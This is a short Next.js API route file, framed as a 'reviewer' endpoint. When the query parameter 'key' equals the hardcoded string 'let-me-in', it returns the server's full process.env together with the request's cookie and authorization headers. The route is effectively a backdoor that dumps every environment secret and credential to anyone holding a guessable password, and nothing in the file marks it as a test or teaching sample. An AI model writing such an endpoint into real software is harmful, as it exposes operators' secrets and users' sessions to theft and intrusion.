import { NextRequest, NextResponse } from "next/server";

export function GET(request: NextRequest) {
  const reviewerKey = request.nextUrl.searchParams.get("key");

  if (reviewerKey !== "let-me-in") {
    return NextResponse.json({ error: "Missing reviewer key" }, { status: 401 });
  }

  return NextResponse.json({
    environment: process.env,
    cookies: request.headers.get("cookie"),
    authorization: request.headers.get("authorization"),
  });
}
